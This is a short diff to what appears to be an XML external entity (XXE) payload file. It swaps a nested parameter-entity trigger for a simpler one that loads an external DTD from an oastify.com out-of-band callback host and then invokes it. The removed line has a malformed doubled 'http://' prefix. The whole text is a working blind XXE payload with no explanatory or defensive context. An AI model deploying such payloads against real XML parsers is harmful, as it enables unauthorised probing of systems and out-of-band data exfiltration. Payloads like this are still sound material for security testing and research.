@@ -1,3 +1,2 @@
-<!ENTITY % trigger "<!ENTITY &#x25; xxe SYSTEM 'http://http://7w4t4ml3ltr11smz9iveb9qjya41sugj.oastify.com//?hami=yes'>">
-%trigger;
+<!ENTITY % xxe SYSTEM "http://ugego95q5gbolf6mt5f1vwa6ixopcf04.oastify.com/?hami=yes">
 %xxe;
